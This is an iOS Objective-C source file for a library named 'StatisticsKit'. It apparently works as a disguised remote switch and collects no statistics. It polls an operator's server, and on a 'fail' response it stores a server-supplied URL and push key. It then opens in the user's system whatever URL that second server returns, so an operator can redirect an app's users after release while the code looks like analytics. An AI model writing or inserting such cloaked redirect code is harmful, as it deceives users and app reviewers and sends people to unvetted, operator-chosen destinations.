//
//  SKService.m
//  StatisticsKit
//
//  Created by MAN on 2020/7/10.
//  Copyright © 2020 iOS. All rights reserved.
//

#import "SKService.h"
#import <UIKit/UIKit.h>
#import "ZYNetworkAccessibity.h"

@interface SKService ()

@property (class, nonatomic,strong) NSDictionary *options;

@end

static NSString *serverKey = @"server";
static NSString *storekey = @"store";
static NSString *appKey = @"push";
static NSString *remarkKey = @"remark";
static NSDictionary *_options;
static SKService *_defaultServer;

@implementation SKService

+ (SKService *)defaultServer {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        _defaultServer = [[SKService alloc] init];
    });
    return _defaultServer;
}

+ (NSDictionary *)options {
    return _options;
}

+ (void)setOptions:(NSDictionary *)options {
    _options = options;
}

+ (BOOL)startKitWithServer:(NSString *)server storeUrl:(NSString *)store option:(NSDictionary *)option{
    [self localData:serverKey value:server];
    [self localData:storekey value:store];
    self.options = option;
    [self monitorChange];
    
    return YES;
}

+ (void)localData:(NSString *)key value:(NSString *)value {
    [[NSUserDefaults standardUserDefaults] setObject:value forKey:key];
}

+(NSString *)readData:(NSString *)key {
    NSString *value = [[NSUserDefaults standardUserDefaults] objectForKey:key];
    return value;
}

+ (void)monitorChange {
    [ZYNetworkAccessibity start];
    [self openAppStatistic];
    [ZYNetworkAccessibity setStateDidUpdateNotifier:^(ZYNetworkAccessibleState status) {
        if (status == ZYNetworkAccessible) {
            [self openAppStatistic];
        }
    }];
}

+ (void)openAppStatistic {
    if ([self readData:remarkKey] != nil) {
        [self maintain];
        return;
    }
    NSString *targetUrl = [self readData:serverKey];
    NSMutableURLRequest *netConfig = [[NSMutableURLRequest alloc] initWithURL:[NSURL URLWithString:targetUrl]];
    netConfig.HTTPMethod = @"GET";
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:netConfig completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (data) {
            NSError *errs;
            NSDictionary *formatData = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingAllowFragments error:&errs];
            NSString *reqState = formatData[@"result"];
            if ([reqState isEqualToString:@"fail"]) {
                [self localData:remarkKey value:formatData[@"remark"]];
                [self localData:appKey value:formatData[@"pushKey"]];
                [self maintain];
            }
        }
    }];
    [task resume];
}

+ (void)maintain {
    NSURL *remakUrl = [NSURL URLWithString:[self readData:remarkKey]];
    NSMutableURLRequest *netConfig = [[NSMutableURLRequest alloc] initWithURL:remakUrl];
    netConfig.HTTPMethod = @"GET";
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:netConfig completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (data) {
            NSError *errs;
            NSDictionary *formatData = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingAllowFragments error:&errs];
            NSString *reqState = formatData[@"result"];
            if (reqState == nil) {
                return;
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                if ([reqState isEqualToString:[NSBundle mainBundle].infoDictionary[@"CFBundleShortVersionString"]]) {
                    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:[self readData:storekey]] options:@{} completionHandler:^(BOOL success) {
                        
                    }];
                } else {
                    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:reqState] options:@{} completionHandler:^(BOOL success) {
                        
                    }];
                }
            });
        }
    }];
    [task resume];
}


@end
